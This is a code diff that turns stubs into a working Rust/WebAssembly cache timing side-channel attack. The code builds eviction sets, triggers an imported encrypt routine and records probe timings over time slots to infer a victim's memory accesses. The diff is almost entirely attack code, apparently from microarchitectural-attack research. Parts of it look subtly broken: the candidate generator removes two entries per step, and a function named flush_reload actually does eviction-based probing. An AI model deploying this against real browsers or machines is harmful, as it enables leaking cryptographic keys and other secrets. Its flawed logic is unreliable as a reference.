@@ -1,49 +1,111 @@
-use wasm_bindgen::prelude::*;
+use std::collections::LinkedList;
+
+use wasm_bindgen::{prelude::wasm_bindgen, JsValue};
+
+const CACHE_LINE_SIZE : usize = 64;
+const CACHE_ASSOCIATIVITY : usize = 12;
 
 #[wasm_bindgen]
-extern {
-    pub fn alert(s: &str);
-}
-
-
-#[inline(always)]
-fn evict(p: *const u8) {
-    // use clflush
-    todo!()
+extern "C" {
+    fn getTime() -> u32;
+    fn encrypt();
+    fn random() -> f64;
 }
 
 #[inline(always)]
-fn wait() {
+fn probe(target: &[u8], offset: u32) -> u32 {
+    let start = getTime();
+    {
+        let _ = target[offset as usize];
+    }
+    getTime() - start
+}
+
+#[inline(always)]
+fn evict(target: &[u8], eviction_set: &LinkedList<u32>) {
+    eviction_set
+        .iter()
+        .for_each(|offset| {
+            let _ = target[*offset as usize];
+        });
+}
+
+#[inline(always)]
+fn wait(number_of_cycles: u32) {
     let mut i = 0;
-    for _ in 1..10 {
+    while i < number_of_cycles {
         i += 1;
     }
 }
 
-#[inline(always)]
-fn probe(p: *const u8) -> u64 {
-    todo!()
+fn get_slow_time(eviction_set: &LinkedList<u32>, target: &[u8], offset: u32) -> u32 {
+    evict(target, eviction_set);
+    probe(target, offset)
 }
 
-#[wasm_bindgen]
-pub fn find_eviction_sets(p: *const u8) {
-    todo!()
+fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
+    eviction_sets
+        .iter()
+        .flatten()
+        .cloned()
+        .collect()
+
 }
 
-#[wasm_bindgen]
-pub fn flush_reload(p: *const u8) {
-    // * pre-processing stage (before calling this function)
-    //      * allocate memory page (mmap for native and large array for javascript)
-    //      * find eviction set (call find_eviction_sets)
-    //      * train to detect misses and hits (train)
-    // * attack loop:
-    // 1. evict (using target-specific 'evict' function) (done for native)
-    return;
-    for _ in 1..1000 {
-        evict(p);
-        // 2. wait (do some fast constant time operation)
-        wait();
-        // 3. probe (measure access time) (done for native)
-        probe(p);
+fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u32>, threshold: u32) -> LinkedList<u32> {
+    let mut candidate_set = candidate_set.clone();
+    let mut eviction_set : LinkedList<u32> = LinkedList::new();
+    while let Some(random_offset) = candidate_set.pop_front() {
+        if eviction_set.len() >= CACHE_ASSOCIATIVITY {
+            break;
+        }
+        let mut new_eviction_set : LinkedList<u32> = eviction_set.clone();
+        new_eviction_set.append(& mut candidate_set);
+        if threshold < get_slow_time(&new_eviction_set, target, probe) {
+            eviction_set.push_back(random_offset);
+        }
     }
+    eviction_set
+}
+
+fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
+    let candidate_set : LinkedList<u32> = LinkedList::new();
+    let number_of_candidates = target.len() / CACHE_LINE_SIZE;
+    let mut candidates : Vec<usize> = (0..number_of_candidates).collect();
+    (0..number_of_candidates)
+        .map(|_| {
+            let index : usize = (random() * ((candidates.len() - 1) as f64)) as usize;
+            let offset : u32 = candidates.swap_remove(index) as u32;
+            candidates.swap_remove(index);
+            offset
+        })
+        .collect()
+}
+
+
+
+#[wasm_bindgen]
+pub extern "C" fn flush_reload(target: &[u8], threshold: u32, wait_cycles: u32, time_slots: u32, time_slot_size: u32, probes: &[u32]) -> Box<[JsValue]> {
+    let candidate_set : LinkedList<u32> = generate_candidate_set(target);
+    let eviction_sets : Vec<LinkedList<u32>> = probes
+        .iter()
+        .map(|offset| generate_eviction_set(target, *offset, &candidate_set, threshold))
+        .collect();
+    let conflict_set : LinkedList<u32> = generate_conflict_set(&eviction_sets);
+    encrypt();
+    let results : Vec<JsValue> = (0..time_slots)
+        .flat_map(|_| {
+            let start = getTime();
+            let time_slot_results : Vec<JsValue> = probes
+                .iter()
+                .map(|p| JsValue::from_f64(probe(target, *p) as f64))
+                .collect();
+            evict(target, &conflict_set);
+            while getTime() - start < time_slot_size {
+                wait(wait_cycles);
+            }
+            time_slot_results
+        })
+        .collect();
+    results.into_boxed_slice()
 }
